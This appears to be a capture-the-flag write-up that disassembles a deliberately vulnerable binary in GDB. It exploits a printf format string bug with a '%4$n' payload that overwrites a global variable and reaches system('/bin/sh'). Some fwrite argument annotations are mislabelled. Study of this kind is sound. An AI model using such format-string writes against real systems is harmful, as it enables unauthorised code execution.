# Level3 - ASM Analysis (GDB only)

## Prerequisites for Exploitation

Before performing any kind of exploitation, we assess the security mitigations in place for this binary.

### 1. Address Space Layout Randomization (ASLR)

Check if ASLR is enabled:

```bash
$ cat /proc/sys/kernel/randomize_va_space
0
```

A value of `0` means ASLR is **disabled**, memory addresses will remain consistent across executions, which simplifies our analysis.

### 2. Stack Protections

Check protections with `checksec`:

```bash
$ checksec --file ./level3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level3
```

**Interpretation:**

* No RELRO: no protection for GOT.
* No Canary: we can overwrite the stack freely.
* NX disabled: stack is executable, though unused here.
* No PIE: binary loads at a fixed address.

**Conclusion:** Classic protections are absent. The binary is trivially exploitable, but the vulnerable point isn’t a buffer overflow. We’ll exploit a format string vulnerability.
We will now move on to disassembling and analyzing the binary's functions using GDB.

## Disassembly Analysis

### Functions Identified

```gdb
(gdb) info functions
...
0x080484a4 v
0x0804851a main
```

These are the two application-specific functions we will analyze.

### Disassembly of `main()`

```asm
0x0804851a <+0>:     push   %ebp
0x0804851b <+1>:     mov    %esp,%ebp
0x0804851d <+3>:     and    $0xfffffff0,%esp
0x08048520 <+6>:     call   0x80484a4 <v>
0x08048525 <+11>:    leave
0x08048526 <+12>:    ret
```

<+0>: Save the old base pointer.  
<+1>: Set up the new stack frame.  
<+3>: Align the stack to a 16-byte boundary.  
<+6>: Call the function `v()`.  
<+11>: Restore the previous base pointer.  
<+12>: Return to caller.  

The main function performs no validation or logic of its own. It delegates all execution to the `v()` function.

### Disassembly of `v()`

```asm
0x080484a4 <+0>:     push   %ebp
0x080484a5 <+1>:     mov    %esp,%ebp
0x080484a7 <+3>:     sub    $0x218,%esp
```

<+0>: Save the caller's base pointer.  
<+1>: Set up a new base pointer.  
<+3>: Reserve 536 bytes of stack space (512 bytes for buffer, plus padding).  

```asm
0x080484ad <+9>:     mov    0x8049860,%eax
0x080484b2 <+14>:    mov    %eax,0x8(%esp)
0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
0x080484be <+26>:    lea    -0x208(%ebp),%eax
0x080484c4 <+32>:    mov    %eax,(%esp)
0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
```

<+9>: Load the address of stdin into EAX.  
<+14>: Move it into the third argument of fgets (stream).  
<+18>: Store 0x200 (512) into the second argument of fgets (size).  
<+26>: Compute address of the buffer at \[ebp - 0x208].  
<+32>: Pass the buffer as first argument to fgets.  
<+35>: Call fgets(buffer, 512, stdin).  

```asm
0x080484cc <+40>:    lea    -0x208(%ebp),%eax
0x080484d2 <+46>:    mov    %eax,(%esp)
0x080484d5 <+49>:    call   0x8048390 <printf@plt>
```

<+40>: Load address of the buffer into EAX.  
<+46>: Pass buffer as argument to printf.  
<+49>: Call printf(buffer). **format string vulnerability**.  

```asm
0x080484da <+54>:    mov    0x804988c,%eax
0x080484df <+59>:    cmp    $0x40,%eax
0x080484e2 <+62>:    jne    0x8048518 <v+116>
```

<+54>: Load the value of global variable `m` from 0x0804988c.  
<+59>: Compare it to 0x40 (decimal 64).  
<+62>: If not equal, jump to end of function.  

```asm
0x080484e4 <+64>:    mov    0x8049880,%eax
0x080484e9 <+69>:    mov    %eax,%edx
0x080484eb <+71>:    mov    $0x8048600,%eax
0x080484f0 <+76>:    mov    %edx,0xc(%esp)
0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
0x080484fc <+88>:    movl   $0x1,0x4(%esp)
0x08048504 <+96>:    mov    %eax,(%esp)
0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
```

<+64>: Load pointer to stdout.  
<+69>: Copy stdout to EDX.  
<+71>: Load pointer to string to be printed into EAX.  
<+76>: Set third fwrite arg (ptr) to stdout.  
<+80>: Set second fwrite arg (size) to 12.  
<+88>: Set first fwrite arg (nmemb) to 1.  
<+96>: Set destination to string address.  
<+99>: Call fwrite("Wait what?!\n", 1, 12, stdout).  

```asm
0x0804850c <+104>:   movl   $0x804860d,(%esp)
0x08048513 <+111>:   call   0x80483c0 <system@plt>
```

<+104>: Load address of "/bin/sh" string.  
<+111>: Call system("/bin/sh") grants shell if reached.  

```asm
0x08048518 <+116>:   leave
0x08048519 <+117>:   ret
```

<+116>: Restore previous base pointer and stack.  
<+117>: Return to caller.  

### Summary

* Input is safely read with fgets (bounded to 512 bytes).
* But then it's used as the format string for printf, which introduces a critical vulnerability.
* If the global variable at `0x0804988c` holds value 0x40 (64), the program prints a message and spawns a shell.
* Our goal is to use the format string bug to write 0x40 to that address.

We will now verify these assumptions and prepare our payload using GDB.

## GDB Runtime Analysis

### Step 1: Inspect the Global Variable `m`

We observed from disassembly that the global variable `m` is located at address `0x0804988c`, as confirmed by the instruction:

```asm
0x080484da <+54>:    mov    0x804988c,%eax
```

Let’s confirm its value in GDB:

```gdb
(gdb) x/wx 0x0804988c
0x804988c <m>:  0x00000000
```

The value is currently 0. Our goal is to set it to `0x40` (decimal 64) to trigger the shell.

### Step 2: Confirm Buffer Location

We place a breakpoint right before the call to `printf()` to inspect the stack:

```gdb
(gdb) break *0x080484d5  # After setting up stack frame
(gdb) run
```

After entering a basic input like "AAAA", inspect the local buffer:

```gdb
(gdb) x/40x $esp
0xbffff510:     0xbffff520      0x00000200      0xb7fd1ac0      0xb7ff37d0
0xbffff520:     0x41414141      0xb7e2000a      0x00000001      0xb7fef305
0xbffff530:     0xbffff588      0xb7fde2d4      0xb7fde334      0x00000007
0xbffff540:     0x00000000      0xb7fde000      0xb7fff53c      0xbffff588
0xbffff550:     0x00000040      0x00000b80      0x00000000      0xb7fde714
0xbffff560:     0x00000098      0x0000000b      0x00000000      0x00000000
0xbffff570:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff580:     0x00000000      0xb7fe765d      0xb7e3ebaf      0x080482bb
0xbffff590:     0x00000000      0x00000000      0x00000000      0xb7fe749f
0xbffff5a0:     0xb7fd5000      0x00000002      0x08048268      0xb7fffc00
```

From the stack dump, we observe that our input "AAAA" appears at address `0xbffff520`. The disassembly shows that the function reserves 0x218 bytes on the stack (`sub esp, 0x218`), and uses `lea -0x208(%ebp)` to access the input buffer. This confirms that the buffer starts at `$ebp - 0x208`, and we can now confidently calculate the offset needed to reach any target variable from the buffer base.

To validate this directly in GDB:

```gdb
(gdb) info registers
...
ebp            0xbffff728       0xbffff728
...
(gdb) print $ebp - 0x208
$1 = 0xbffff520
```

This matches the buffer address seen earlier (`0xbffff520`), confirming the layout precisely.

### Step 3: Examine Address on Stack

Let’s inject the address of `m` and observe its placement:

```bash
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' | ./level3
� 200 b7fd1ac0 b7ff37d0 804988c
```

This shows that the address of `m` is at the **4th position** on the stack.

### Step 4: Test Format String Write

Our goal is to write the value 64 (0x40) to the memory location `0x0804988c`, where the global variable `m` is stored. The format specifier `%n` will write the number of characters printed so far to the memory address we place on the stack.

We craft a payload that prints 64 characters before reaching `%4$n`:

```bash
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' > /tmp/exploit
```

To validate that the payload works as expected, we place two breakpoints in GDB:

* The first is set just after the call to `printf()` at address `0x080484da`, where the program checks the value of `m`.
* The second is placed on the `system()` function, to confirm that the program attempts to launch a shell.

```gdb
(gdb) break *0x080484da    # Right after printf(), before comparing m
(gdb) break system         # Catch call to system("/bin/sh")
(gdb) run < /tmp/exploit
```

Once the first breakpoint is hit, we inspect the value of `m`:

```gdb
(gdb) x/wx 0x0804988c
0x804988c <m>:  0x00000040
```

This confirms that `%n` successfully wrote the value `0x40` (64 in decimal) to `m`.

When execution resumes, GDB stops again at the `system()` call. We can inspect its argument:

```gdb
(gdb) continue
Continuing.
Wait what?!

Breakpoint 2, 0xb7e6b060 in system () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/4wx $esp
0xbffff50c:     0x08048518      0x0804860d      0x00000001      0x0000000c
(gdb) x/s 0x0804860d
0x804860d:       "/bin/sh"
```

This proves that the program is about to execute `system("/bin/sh")` with the correct argument.

### Conclusion

This level demonstrates how a seemingly simple format string vulnerability can be turned into a controlled memory write when paired with precise stack layout knowledge. Rather than relying on trial-and-error payloads, we used GDB to dissect the runtime behavior of the binary, identifying:

* The exact location of the user-controlled buffer on the stack (`0xbffff520`) (calculated from $ebp - 0x208)
* The memory address of the target variable `m` (`0x0804988c`)
* The condition that triggers code execution (`m == 64`)
* The stack position at which our format string argument was interpreted (`%4$n`)

GDB allowed us to trace the execution path step-by-step, confirm the write effect of `%n`, and observe the resulting call to `system("/bin/sh")` in memory. This reinforces the value of dynamic analysis in understanding and validating exploits in real time especially when dealing with stack-based input, indirect control flow, and conditionally gated payloads.
